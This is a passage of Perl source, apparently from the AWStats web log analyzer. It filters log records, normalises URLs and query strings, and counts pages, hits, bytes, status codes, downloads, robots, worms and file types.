&SkipHost( $field[$pos_hostr] ) ) )\n\t\t  )\n\t\t{\n\t\t\t$qualifdrop =\n\t\t\t    \"Dropped record (host $field[$pos_host]\"\n\t\t\t  . ( $pos_hostr ? \" and $field[$pos_hostr]\" : \"\" )\n\t\t\t  . \" not qualified by SkipHosts)\";\n\t\t}\n\t\telsif ( @SkipFiles && &SkipFile( $field[$pos_url] ) ) {\n\t\t\t$qualifdrop =\n\"Dropped record (URL $field[$pos_url] not qualified by SkipFiles)\";\n\t\t}\n\t\telsif (@SkipUserAgents\n\t\t\t&& $pos_agent >= 0\n\t\t\t&& &SkipUserAgent( $field[$pos_agent] ) )\n\t\t{\n\t\t\t$qualifdrop =\n\"Dropped record (user agent '$field[$pos_agent]' not qualified by SkipUserAgents)\";\n\t\t}\n\t\telsif (@SkipReferrers\n\t\t\t&& $pos_referer >= 0\n\t\t\t&& &SkipReferrer( $field[$pos_referer] ) )\n\t\t{\n\t\t\t$qualifdrop =\n\"Dropped record (URL $field[$pos_referer] not qualified by SkipReferrers)\";\n\t\t}\n\t\telsif (@OnlyHosts\n\t\t\t&& !&OnlyHost( $field[$pos_host] )\n\t\t\t&& ( !$pos_hostr || !&OnlyHost( $field[$pos_hostr] ) ) )\n\t\t{\n\t\t\t$qualifdrop =\n\t\t\t    \"Dropped record (host $field[$pos_host]\"\n\t\t\t  . ( $pos_hostr ? \" and $field[$pos_hostr]\" : \"\" )\n\t\t\t  . \" not qualified by OnlyHosts)\";\n\t\t}\n\t\telsif ( @OnlyUsers && !&OnlyUser( $field[$pos_logname] ) ) {\n\t\t\t$qualifdrop =\n\"Dropped record (URL $field[$pos_logname] not qualified by OnlyUsers)\";\n\t\t}\n\t\telsif ( @OnlyFiles && !&OnlyFile( $field[$pos_url] ) ) {\n\t\t\t$qualifdrop =\n\"Dropped record (URL $field[$pos_url] not qualified by OnlyFiles)\";\n\t\t}\n\t\telsif ( @OnlyUserAgents && !&OnlyUserAgent( $field[$pos_agent] ) ) {\n\t\t\t$qualifdrop =\n\"Dropped record (user agent '$field[$pos_agent]' not qualified by OnlyUserAgents)\";\n\t\t}\n\t\tif ($qualifdrop) {\n\t\t\t$NbOfLinesDropped++;\n\t\t\tif ($Debug) { debug( \"$qualifdrop: $line\", 4 ); }\n\t\t\tif ($ShowDropped) { print \"$qualifdrop: $line\\n\"; }\n\t\t\t$qualifdrop = '';\n\t\t\tnext;\n\t\t}\n\n\t\t# Record is approved\n\t\t#-------------------\n\n\t\t# Is it in a new break section ?\n\t\t#-------------------------------\n\t\tif ( $daterecord > $lastprocesseddate ) {\n\n\t\t\t# A new break to process\n\t\t\tif ( $lastprocesseddate > 0 ) {\n\n\t\t\t\t# We save data of previous break\n\t\t\t\t&Read_History_With_TmpUpdate(\n\t\t\t\t\t$lastprocessedyear, $lastprocessedmonth,\n\t\t\t\t\t$lastprocessedday,  $lastprocessedhour,\n\t\t\t\t\t1,                  1,\n\t\t\t\t\t\"all\", ( $lastlinenb + $NbOfLinesParsed ),\n\t\t\t\t\t$lastlineoffset, &CheckSum($line)\n\t\t\t\t);\n\t\t\t\t$counterforflushtest = 0;    # We reset counterforflushtest\n\t\t\t}\n\t\t\t$lastprocessedyear  = $yearrecord;\n\t\t\t$lastprocessedmonth = $monthrecord;\n\t\t\t$lastprocessedday   = $dayrecord;\n\t\t\t$lastprocessedhour  = $hourrecord;\n\t\t\tif ( $DatabaseBreak eq 'month' ) {\n\t\t\t\t$lastprocesseddate =\n\t\t\t\t  sprintf( \"%04i%02i\", $yearrecord, $monthrecord );\n\t\t\t}\n\t\t\telsif ( $DatabaseBreak eq 'year' ) {\n\t\t\t\t$lastprocesseddate = sprintf( \"%04i%\", $yearrecord );\n\t\t\t}\n\t\t\telsif ( $DatabaseBreak eq 'day' ) {\n\t\t\t\t$lastprocesseddate = sprintf( \"%04i%02i%02i\",\n\t\t\t\t\t$yearrecord, $monthrecord, $dayrecord );\n\t\t\t}\n\t\t\telsif ( $DatabaseBreak eq 'hour' ) {\n\t\t\t\t$lastprocesseddate = sprintf( \"%04i%02i%02i%02i\",\n\t\t\t\t\t$yearrecord, $monthrecord, $dayrecord, $hourrecord );\n\t\t\t}\n\t\t}\n\n\t\t$countedtraffic = 0;\n\t\t$NbOfNewLines++;\n\n\t\t# Convert $field[$pos_size]\n\t\t# if ($field[$pos_size] eq '-') { $field[$pos_size]=0; }\n\n\t# Define a clean target URL and referrer URL\n\t# We keep a clean $field[$pos_url] and\n\t# we store original value for urlwithnoquery, tokenquery and standalonequery\n\t#---------------------------------------------------------------------------\n\t\tif ($URLNotCaseSensitive) { $field[$pos_url] = lc( $field[$pos_url] ); }\n\n# Possible URL syntax for $field[$pos_url]: /mydir/mypage.ext?param1=x&param2=y#aaa, /mydir/mypage.ext#aaa, /\n\t\tmy $urlwithnoquery;\n\t\tmy $tokenquery;\n\t\tmy $standalonequery;\n\t\tmy $anchor = '';\n\t\tif ( $field[$pos_url] =~ s/$regtruncanchor//o ) {\n\t\t\t$anchor = $1;\n\t\t}    # Remove and save anchor\n\t\tif ($URLWithQuery) {\n\t\t\t$urlwithnoquery = $field[$pos_url];\n\t\t\tmy $foundparam = ( $urlwithnoquery =~ s/$regtruncurl//o );\n\t\t\t$tokenquery      = $1 || '';\n\t\t\t$standalonequery = $2 || '';\n\n# For IIS setup, if pos_query is enabled we need to combine the URL to query strings\n\t\t\tif (   !$foundparam\n\t\t\t\t&& $pos_query >= 0\n\t\t\t\t&& $field[$pos_query]\n\t\t\t\t&& $field[$pos_query] ne '-' )\n\t\t\t{\n\t\t\t\t$foundparam      = 1;\n\t\t\t\t$tokenquery      = '?';\n\t\t\t\t$standalonequery = $field[$pos_query];\n\n\t\t\t\t# Define query\n\t\t\t\t$field[$pos_url] .= '?' . $field[$pos_query];\n\t\t\t}\n\t\t\tif ($foundparam) {\n\n  # Keep only params that are defined in URLWithQueryWithOnlyFollowingParameters\n\t\t\t\tmy $newstandalonequery = '';\n\t\t\t\tif (@URLWithQueryWithOnly) {\n\t\t\t\t\tforeach (@URLWithQueryWithOnly) {\n\t\t\t\t\t\tforeach my $p ( split( /&/, $standalonequery ) ) {\n\t\t\t\t\t\t\tif ($URLNotCaseSensitive) {\n\t\t\t\t\t\t\t\tif ( $p =~ /^$_=/i ) {\n\t\t\t\t\t\t\t\t\t$newstandalonequery .= \"$p&\";\n\t\t\t\t\t\t\t\t\tlast;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t\tif ( $p =~ /^$_=/ ) {\n\t\t\t\t\t\t\t\t\t$newstandalonequery .= \"$p&\";\n\t\t\t\t\t\t\t\t\tlast;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\tchop $newstandalonequery;\n\t\t\t\t}\n\n# Remove params that are marked to be ignored in URLWithQueryWithoutFollowingParameters\n\t\t\t\telsif (@URLWithQueryWithout) {\n\t\t\t\t\tforeach my $p ( split( /&/, $standalonequery ) ) {\n\t\t\t\t\t\tmy $found = 0;\n\t\t\t\t\t\tforeach (@URLWithQueryWithout) {\n\n#if ($Debug) { debug(\"  Check if '$_=' is param '$p' to remove it from query\",5); }\n\t\t\t\t\t\t\tif ($URLNotCaseSensitive) {\n\t\t\t\t\t\t\t\tif ( $p =~ /^$_=/i ) { $found = 1; last; }\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t\tif ( $p =~ /^$_=/ ) { $found = 1; last; }\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t\tif ( !$found ) { $newstandalonequery .= \"$p&\"; }\n\t\t\t\t\t}\n\t\t\t\t\tchop $newstandalonequery;\n\t\t\t\t}\n\t\t\t\telse { $newstandalonequery = $standalonequery; }\n\n\t\t\t\t# Define query\n\t\t\t\t$field[$pos_url] = $urlwithnoquery;\n\t\t\t\tif ($newstandalonequery) {\n\t\t\t\t\t$field[$pos_url] .= \"$tokenquery$newstandalonequery\";\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\telse {\n\n\t\t\t# Trunc parameters of URL\n\t\t\t$field[$pos_url] =~ s/$regtruncurl//o;\n\t\t\t$urlwithnoquery  = $field[$pos_url];\n\t\t\t$tokenquery      = $1 || '';\n\t\t\t$standalonequery = $2 || '';\n\n\t# For IIS setup, if pos_query is enabled we need to use it for query strings\n\t\t\tif (   $pos_query >= 0\n\t\t\t\t&& $field[$pos_query]\n\t\t\t\t&& $field[$pos_query] ne '-' )\n\t\t\t{\n\t\t\t\t$tokenquery      = '?';\n\t\t\t\t$standalonequery = $field[$pos_query];\n\t\t\t}\n\t\t}\n\t\tif ( $URLWithAnchor && $anchor ) {\n\t\t\t$field[$pos_url] .= \"#$anchor\";\n\t\t}   # Restore anchor\n\t\t    # Here now urlwithnoquery is /mydir/mypage.ext, /mydir, /, /page#XXX\n\t\t    # Here now tokenquery is '' or '?' or ';'\n\t\t    # Here now standalonequery is '' or 'param1=x'\n\n\t\t# Define page and extension\n\t\t#--------------------------\n\t\tmy $PageBool = 1;\n\n\t\t# Extension\n\t\tmy $extension = Get_Extension($regext, $urlwithnoquery);\n\t\tif ( $NotPageList{$extension} || \n\t\t($MimeHashLib{$extension}[1]) && $MimeHashLib{$extension}[1] ne 'p') { $PageBool = 0;}\n\t\tif ( @NotPageFiles && &NotPageFile( $field[$pos_url] ) ) { $PageBool = 0; }\n\n\t\t# Analyze: misc tracker (must be before return code)\n\t\t#---------------------------------------------------\n\t\tif ( $urlwithnoquery =~ /$regmisc/o ) {\n\t\t\tif ($Debug) {\n\t\t\t\tdebug(\n\"  Found an URL that is a MiscTracker record with standalonequery=$standalonequery\",\n\t\t\t\t\t2\n\t\t\t\t);\n\t\t\t}\n\t\t\tmy $foundparam = 0;\n\t\t\tforeach ( split( /&/, $standalonequery ) ) {\n\t\t\t\tif ( $_ =~ /^screen=(\\d+)x(\\d+)/i ) {\n\t\t\t\t\t$foundparam++;\n\t\t\t\t\t$_screensize_h{\"$1x$2\"}++;\n\t\t\t\t\tnext;\n\t\t\t\t}\n\n   #if ($_ =~ /cdi=(\\d+)/i) \t\t\t{ $foundparam++; $_screendepth_h{\"$1\"}++; next; }\n\t\t\t\tif ( $_ =~ /^nojs=(\\w+)/i ) {\n\t\t\t\t\t$foundparam++;\n\t\t\t\t\tif ( $1 eq 'y' ) { $_misc_h{\"JavascriptDisabled\"}++; }\n\t\t\t\t\tnext;\n\t\t\t\t}\n\t\t\t\tif ( $_ =~ /^java=(\\w+)/i ) {\n\t\t\t\t\t$foundparam++;\n\t\t\t\t\tif ( $1 eq 'true' ) { $_misc_h{\"JavaEnabled\"}++; }\n\t\t\t\t\tnext;\n\t\t\t\t}\n\t\t\t\tif ( $_ =~ /^shk=(\\w+)/i ) {\n\t\t\t\t\t$foundparam++;\n\t\t\t\t\tif ( $1 eq 'y' ) { $_misc_h{\"DirectorSupport\"}++; }\n\t\t\t\t\tnext;\n\t\t\t\t}\n\t\t\t\tif ( $_ =~ /^fla=(\\w+)/i ) {\n\t\t\t\t\t$foundparam++;\n\t\t\t\t\tif ( $1 eq 'y' ) { $_misc_h{\"FlashSupport\"}++; }\n\t\t\t\t\tnext;\n\t\t\t\t}\n\t\t\t\tif ( $_ =~ /^rp=(\\w+)/i ) {\n\t\t\t\t\t$foundparam++;\n\t\t\t\t\tif ( $1 eq 'y' ) { $_misc_h{\"RealPlayerSupport\"}++; }\n\t\t\t\t\tnext;\n\t\t\t\t}\n\t\t\t\tif ( $_ =~ /^mov=(\\w+)/i ) {\n\t\t\t\t\t$foundparam++;\n\t\t\t\t\tif ( $1 eq 'y' ) { $_misc_h{\"QuickTimeSupport\"}++; }\n\t\t\t\t\tnext;\n\t\t\t\t}\n\t\t\t\tif ( $_ =~ /^wma=(\\w+)/i ) {\n\t\t\t\t\t$foundparam++;\n\t\t\t\t\tif ( $1 eq 'y' ) {\n\t\t\t\t\t\t$_misc_h{\"WindowsMediaPlayerSupport\"}++;\n\t\t\t\t\t}\n\t\t\t\t\tnext;\n\t\t\t\t}\n\t\t\t\tif ( $_ =~ /^pdf=(\\w+)/i ) {\n\t\t\t\t\t$foundparam++;\n\t\t\t\t\tif ( $1 eq 'y' ) { $_misc_h{\"PDFSupport\"}++; }\n\t\t\t\t\tnext;\n\t\t\t\t}\n\t\t\t}\n\t\t\tif ($foundparam) { $_misc_h{\"TotalMisc\"}++; }\n\t\t}\n\n\t\t# Analyze: successful favicon (=> countedtraffic=1 if favicon)\n\t\t#--------------------------------------------------\n\t\tif ( $urlwithnoquery =~ /$regfavico/o ) {\n\t\t\tif ( $field[$pos_code] != 404 ) {\n\t\t\t\t$_misc_h{'AddToFavourites'}++;\n\t\t\t}\n\t\t\t$countedtraffic =\n\t\t\t  1;    # favicon is a case that must not be counted anywhere else\n\t\t\t$_time_nv_h[$hourrecord]++;\n\t\t\tif ( $field[$pos_code] != 404 && $pos_size>0) {\n\t\t\t\t$_time_nv_k[$hourrecord] += int( $field[$pos_size] );\n\t\t\t}\n\t\t}\n\n\t\t# Analyze: Worms (=> countedtraffic=2 if worm)\n\t\t#---------------------------------------------\n\t\tif ( !$countedtraffic ) {\n\t\t\tif ($LevelForWormsDetection) {\n\t\t\t\tforeach (@WormsSearchIDOrder) {\n\t\t\t\t\tif ( $field[$pos_url] =~ /$_/ ) {\n\n\t\t\t\t\t\t# It's a worm\n\t\t\t\t\t\tmy $worm = &UnCompileRegex($_);\n\t\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\t\tdebug(\n\" Record is a hit from a worm identified by '$worm'\",\n\t\t\t\t\t\t\t\t2\n\t\t\t\t\t\t\t);\n\t\t\t\t\t\t}\n\t\t\t\t\t\t$worm = $WormsHashID{$worm} || 'unknown';\n\t\t\t\t\t\t$_worm_h{$worm}++;\n\t\t\t\t\t\tif ($pos_size>0){$_worm_k{$worm} += int( $field[$pos_size] );}\n\t\t\t\t\t\t$_worm_l{$worm} = $timerecord;\n\t\t\t\t\t\t$countedtraffic = 2;\n\t\t\t\t\t\tif ($PageBool) { $_time_nv_p[$hourrecord]++; }\n\t\t\t\t\t\t$_time_nv_h[$hourrecord]++;\n\t\t\t\t\t\tif ($pos_size>0){$_time_nv_k[$hourrecord] += int( $field[$pos_size] );}\n\t\t\t\t\t\tlast;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\t# Analyze: Status code (=> countedtraffic=3 if error)\n\t\t#----------------------------------------------------\n\t\tif ( !$countedtraffic ) {\n\t\t\tif ( $LogType eq 'W' || $LogType eq 'S' )\n\t\t\t{    # HTTP record or Stream record\n\t\t\t\tif ( $ValidHTTPCodes{ $field[$pos_code] } ) {    # Code is valid\n\t\t\t\t\tif ( int($field[$pos_code]) == 304 && $pos_size>0) { $field[$pos_size] = 0; }\n\t\t\t\t\t# track downloads\n\t\t\t\t\tif (int($field[$pos_code]) == 200 && $MimeHashLib{$extension}[1] eq 'd' && $urlwithnoquery !~ /robots.txt$/ )  # We track download if $MimeHashLib{$extension}[1] = 'd'\n\t\t\t\t\t{\n\t\t\t\t\t\t$_downloads{$urlwithnoquery}->{'AWSTATS_HITS'}++;\n\t\t\t\t\t\t$_downloads{$urlwithnoquery}->{'AWSTATS_SIZE'} += ($pos_size>0 ? int($field[$pos_size]) : 0);\n\t\t\t\t\t\tif ($Debug) { debug( \" New download detected: '$urlwithnoquery'\", 2 ); }\n\t\t\t\t\t}\n\t\t\t\t# handle 206 download continuation message IF we had a successful 200 before, otherwise it goes in errors\n\t\t\t\t}elsif(int($field[$pos_code]) == 206 \n\t\t\t\t\t#&& $_downloads{$urlwithnoquery}->{$field[$pos_host]}[0] > 0 \n\t\t\t\t\t&& ($MimeHashLib{$extension}[1] eq 'd')){\n\t\t\t\t\t$_downloads{$urlwithnoquery}->{'AWSTATS_SIZE'} += ($pos_size>0 ? int($field[$pos_size]) : 0);\n\t\t\t\t\t$_downloads{$urlwithnoquery}->{'AWSTATS_206'}++;\n\t\t\t\t\t#$_downloads{$urlwithnoquery}->{$field[$pos_host]}[1] = $timerecord;\n\t\t\t\t\tif ($pos_size>0){\n\t\t\t\t\t\t#$_downloads{$urlwithnoquery}->{$field[$pos_host]}[2] = int($field[$pos_size]);\n\t\t\t\t\t\t$DayBytes{$yearmonthdayrecord} += int($field[$pos_size]);\n\t\t\t\t\t\t$_time_k[$hourrecord] += int($field[$pos_size]);\n\t\t\t\t\t}\n\t\t\t\t\t$countedtraffic = 6; # 206 continued download, so we track bandwidth but not pages or hits\n\t\t\t\t\tif ($Debug) { debug( \" Download continuation detected: '$urlwithnoquery'\", 2 ); }\n  \t\t\t\t}else {    # Code is not valid\n\t\t\t\t\tif ( $field[$pos_code] !~ /^\\d\\d\\d$/ ) {\n\t\t\t\t\t\t$field[$pos_code] = 999;\n\t\t\t\t\t}\n\t\t\t\t\t$_errors_h{ $field[$pos_code] }++;\n\t\t\t\t\tif ($pos_size>0){$_errors_k{ $field[$pos_code] } += int( $field[$pos_size] );}\n\t\t\t\t\tforeach my $code ( keys %TrapInfosForHTTPErrorCodes ) {\n\t\t\t\t\t\tif ( $field[$pos_code] == $code ) {\n\n\t\t\t\t\t\t\t# This is an error code which referrer need to be tracked\n\t\t\t\t\t\t\tmy $newurl =\n\t\t\t\t\t\t\t  substr( $field[$pos_url], 0,\n\t\t\t\t\t\t\t\t$MaxLengthOfStoredURL );\n\t\t\t\t\t\t\t$newurl =~ s/[$URLQuerySeparators].*$//;\n\t\t\t\t\t\t\t$_sider_h{$code}{$newurl}++;\n\t\t\t\t\t\t\tif ( $pos_referer >= 0 && $ShowHTTPErrorsPageDetail =~ /R/i  ) {\n\t\t\t\t\t\t\t\tmy $newreferer = $field[$pos_referer];\n\t\t\t\t\t\t\t\tif ( !$URLReferrerWithQuery ) {\n\t\t\t\t\t\t\t\t\t$newreferer =~ s/[$URLQuerySeparators].*$//;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t$_referer_h{$code}{$newurl} = $newreferer;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif ( $pos_host >= 0 && $ShowHTTPErrorsPageDetail =~ /H/i ) {\n\t\t\t\t\t\t\t\tmy $newhost = $field[$pos_host];\n\t\t\t\t\t\t\t\tif ( !$URLReferrerWithQuery ) {\n\t\t\t\t\t\t\t\t\t$newhost =~ s/[$URLQuerySeparators].*$//;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t$_err_host_h{$code}{$newurl} = $newhost;\n\t\t\t\t\t\t\t\tlast;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\tdebug(\n\" Record stored in the status code chart (status code=$field[$pos_code])\",\n\t\t\t\t\t\t\t3\n\t\t\t\t\t\t);\n\t\t\t\t\t}\n\t\t\t\t\t$countedtraffic = 3;\n\t\t\t\t\tif ($PageBool) { $_time_nv_p[$hourrecord]++; }\n\t\t\t\t\t$_time_nv_h[$hourrecord]++;\n\t\t\t\t\tif ($pos_size>0){$_time_nv_k[$hourrecord] += int( $field[$pos_size] );}\n\t\t\t\t}\n\t\t\t}\n\t\t\telsif ( $LogType eq 'M' ) {    # Mail record\n\t\t\t\tif ( !$ValidSMTPCodes{ $field[$pos_code] } )\n\t\t\t\t{                          # Code is not valid\n\t\t\t\t\t$_errors_h{ $field[$pos_code] }++;\n\t\t\t\t\tif ( $field[$pos_size] ne '-' && $pos_size>0) {\n\t\t\t\t\t\t$_errors_k{ $field[$pos_code] } +=\n\t\t\t\t\t\t  int( $field[$pos_size] );\n\t\t\t\t\t}\n\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\tdebug(\n\" Record stored in the status code chart (status code=$field[$pos_code])\",\n\t\t\t\t\t\t\t3\n\t\t\t\t\t\t);\n\t\t\t\t\t}\n\t\t\t\t\t$countedtraffic = 3;\n\t\t\t\t\tif ($PageBool) { $_time_nv_p[$hourrecord]++; }\n\t\t\t\t\t$_time_nv_h[$hourrecord]++;\n\t\t\t\t\tif ( $field[$pos_size] ne '-' && $pos_size>0) {\n\t\t\t\t\t\t$_time_nv_k[$hourrecord] += int( $field[$pos_size] );\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\telsif ( $LogType eq 'F' ) {    # FTP record\n\t\t\t}\n\t\t}\n\n\t\t# Analyze: Robot from robot database (=> countedtraffic=4 if robot)\n\t\t#------------------------------------------------------------------\n\t\tif ( !$countedtraffic ) {\n\t\t\tif ( $pos_agent >= 0 ) {\n\t\t\t\tif ($DecodeUA) {\n\t\t\t\t\t$field[$pos_agent] =~ s/%20/_/g;\n\t\t\t\t} # This is to support servers (like Roxen) that writes user agent with %20 in it\n\t\t\t\t$UserAgent = $field[$pos_agent];\n\t\t\t\tif ( $UserAgent && $UserAgent eq '-' ) { $UserAgent = ''; }\n\n\t\t\t\tif ($LevelForRobotsDetection) {\n\n\t\t\t\t\tif ($UserAgent) {\n\t\t\t\t\t\tmy $uarobot = $TmpRobot{$UserAgent};\n\t\t\t\t\t\tif ( !$uarobot ) {\n\n\t\t\t\t\t\t\t#study $UserAgent;\t\tDoes not increase speed\n\t\t\t\t\t\t\tforeach (@RobotsSearchIDOrder) {\n\t\t\t\t\t\t\t\tif ( $UserAgent =~ /$_/ ) {\n\t\t\t\t\t\t\t\t\tmy $bot = &UnCompileRegex($_);\n\t\t\t\t\t\t\t\t\t$TmpRobot{$UserAgent} = $uarobot = \"$bot\"\n\t\t\t\t\t\t\t\t\t  ; # Last time, we won't search if robot or not. We know it is.\n\t\t\t\t\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\t\t\t\t\tdebug(\n\"  UserAgent '$UserAgent' is added to TmpRobot with value '$bot'\",\n\t\t\t\t\t\t\t\t\t\t\t2\n\t\t\t\t\t\t\t\t\t\t);\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\tlast;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif ( !$uarobot )\n\t\t\t\t\t\t\t{ # Last time, we won't search if robot or not. We know it's not.\n\t\t\t\t\t\t\t\t$TmpRobot{$UserAgent} = $uarobot = '-';\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t\tif ( $uarobot ne '-' ) {\n\n\t\t\t\t\t\t\t# If robot, we stop here\n\t\t\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\t\t\tdebug(\n\"  UserAgent '$UserAgent' contains robot ID '$uarobot'\",\n\t\t\t\t\t\t\t\t\t2\n\t\t\t\t\t\t\t\t);\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t$_robot_h{$uarobot}++;\n\t\t\t\t\t\t\tif ( $field[$pos_size] ne '-' && $pos_size>0) {\n\t\t\t\t\t\t\t\t$_robot_k{$uarobot} += int( $field[$pos_size] );\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t$_robot_l{$uarobot} = $timerecord;\n\t\t\t\t\t\t\tif ( $urlwithnoquery =~ /$regrobot/o ) {\n\t\t\t\t\t\t\t\t$_robot_r{$uarobot}++;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t$countedtraffic = 4;\n\t\t\t\t\t\t\tif ($PageBool) { $_time_nv_p[$hourrecord]++; }\n\t\t\t\t\t\t\t$_time_nv_h[$hourrecord]++;\n\t\t\t\t\t\t\tif ( $field[$pos_size] ne '-' && $pos_size>0) {\n\t\t\t\t\t\t\t\t$_time_nv_k[$hourrecord] +=\n\t\t\t\t\t\t\t\t  int( $field[$pos_size] );\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\telse {\n\t\t\t\t\t\tmy $uarobot = 'no_user_agent';\n\n\t\t\t\t\t\t# It's a robot or at least a bad browser, we stop here\n\t\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\t\tdebug(\n\"  UserAgent not defined so it should be a robot, saved as robot 'no_user_agent'\",\n\t\t\t\t\t\t\t\t2\n\t\t\t\t\t\t\t);\n\t\t\t\t\t\t}\n\t\t\t\t\t\t$_robot_h{$uarobot}++;\n\t\t\t\t\t\tif ($pos_size>0){$_robot_k{$uarobot} += int( $field[$pos_size] );}\n\t\t\t\t\t\t$_robot_l{$uarobot} = $timerecord;\n\t\t\t\t\t\tif ( $urlwithnoquery =~ /$regrobot/o ) {\n\t\t\t\t\t\t\t$_robot_r{$uarobot}++;\n\t\t\t\t\t\t}\n\t\t\t\t\t\t$countedtraffic = 4;\n\t\t\t\t\t\tif ($PageBool) { $_time_nv_p[$hourrecord]++; }\n\t\t\t\t\t\t$_time_nv_h[$hourrecord]++;\n\t\t\t\t\t\tif ($pos_size>0){$_time_nv_k[$hourrecord] += int( $field[$pos_size] );}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n   # Analyze: Robot from \"hit on robots.txt\" file (=> countedtraffic=5 if robot)\n   # -------------------------------------------------------------------------\n\t\tif ( !$countedtraffic ) {\n\t\t\tif ( $urlwithnoquery =~ /$regrobot/o ) {\n\t\t\t\tif ($Debug) { debug( \"  It's an unknown robot\", 2 ); }\n\t\t\t\t$_robot_h{'unknown'}++;\n\t\t\t\tif ($pos_size>0){$_robot_k{'unknown'} += int( $field[$pos_size] );}\n\t\t\t\t$_robot_l{'unknown'} = $timerecord;\n\t\t\t\t$_robot_r{'unknown'}++;\n\t\t\t\t$countedtraffic = 5;    # Must not be counted somewhere else\n\t\t\t\tif ($PageBool) { $_time_nv_p[$hourrecord]++; }\n\t\t\t\t$_time_nv_h[$hourrecord]++;\n\t\t\t\tif ($pos_size>0){$_time_nv_k[$hourrecord] += int( $field[$pos_size] );}\n\t\t\t}\n\t\t}\n\n\t\t# Analyze: File type - Compression\n\t\t#---------------------------------\n\t\tif ( !$countedtraffic || $countedtraffic == 6) {\n\t\t\tif ($LevelForFileTypesDetection) {\n\t\t\t\tif ($countedtraffic != 6){$_filetypes_h{$extension}++;}\n\t\t\t\tif ( $field[$pos_size] ne '-' && $pos_size>0) {\n\t\t\t\t\t$_filetypes_k{$extension} += int( $field[$pos_size] );\n\t\t\t\t}\n\n\t\t\t\t# Compression\n\t\t\t\tif ( $pos_gzipin >= 0 && $field[$pos_gzipin] )\n\t\t\t\t{    # If in and out in log\n\t\t\t\t\tmy ( $notused, $in ) = split( /:/, $field[$pos_gzipin] );\n\t\t\t\t\tmy ( $notused1, $out, $notused2 ) =\n\t\t\t\t\t  split( /:/, $field[$pos_gzipout] );\n\t\t\t\t\tif ($out) {\n\t\t\t\t\t\t$_filetypes_gz_in{$extension}  += $in;\n\t\t\t\t\t\t$_filetypes_gz_out{$extension} += $out;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telsif ( $pos_compratio >= 0\n\t\t\t\t\t&& ( $field[$pos_compratio] =~ /(\\d+)/ ) )\n\t\t\t\t{    # Calculate in/out size from percentage\n\t\t\t\t\tif ( $fieldlib[$pos_compratio] eq 'gzipratio' ) {\n\n\t# with mod_gzip:    % is size (before-after)/before (low for jpg) ??????????\n\t\t\t\t\t\t$_filetypes_gz_in{$extension} +=\n\t\t\t\t\t\t  int(\n\t\t\t\t\t\t\t$field[$pos_size] * 100 / ( ( 100 - $1 ) || 1 ) );\n\t\t\t\t\t}\n\t\t\t\t\telse {\n\n\t\t\t\t\t   # with mod_deflate: % is size after/before (high for jpg)\n\t\t\t\t\t\t$_filetypes_gz_in{$extension} +=\n\t\t\t\t\t\t  int( $field[$pos_size] * 100 / ( $1 || 1 ) );\n\t\t\t\t\t}\n\t\t\t\t\tif ($pos_size>0){$_filetypes_gz_out{$extension} += int( $field[$pos_size] );}\n\t\t\t\t}\n\t\t\t}\n\n\t\t\t# Analyze: Date - Hour - Pages - Hits - Kilo\n\t\t\t#-------------------------------------------\n\t\t\tif ($PageBool) {\n\n# Replace default page name with / only ('if' is to increase speed when only 1 value in @DefaultFile)\n\t\t\t\tif ( @DefaultFile > 1 ) {\n\t\t\t\t\tforeach my $elem (@DefaultFile) {\n\t\t\t\t\t\tif ( $field[$pos_url] =~ s/\\/$elem$/\\// ) { last; }\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telse { $field[$pos_url] =~ s/$regdefault/\\//o; }\n\n# FirstTime and LastTime are First and Last human visits (so changed if access to a page)\n\t\t\t\t$FirstTime{$lastprocesseddate} ||= $timerecord;\n\t\t\t\t$LastTime{$lastprocesseddate} = $timerecord;\n\t\t\t\t$DayPages{$yearmonthdayrecord}++;\n\t\t\t\t$_url_p{ $field[$pos_url] }++;   #Count accesses for page (page)\n\t\t\t\tif ( $field[$pos_size] ne '-' && $pos_size>0) {\n\t\t\t\t\t$_url_k{ $field[$pos_url] } += int( $field[$pos_size] );\n\t\t\t\t}\n\t\t\t\t$_time_p[$hourrecord]++;    #Count accesses for hour (page)\n\t\t\t\t                            # TODO Use an id for hash key of url\n\t\t\t\t                            # $_url_t{$_url_id}\n\t\t\t}\n\t\t\tif ($countedtraffic != 6){$_time_h[$hourrecord]++;}\n \t\t\tif ($countedtraffic != 6){$DayHits{$yearmonthdayrecord}++;}    #Count accesses for hour (hit)\n  \t\t\tif ( $field[$pos_size] ne '-' && $pos_size>0) {\n  \t\t\t\t$_time_k[$hourrecord]          += int( $field[$pos_size] );\n \t\t\t\t$DayBytes{$yearmonthdayrecord} += int( $field[$pos_size] );     #Count accesses for hour (kb)\n  \t\t\t}\n\n\t\t\t# Analyze: 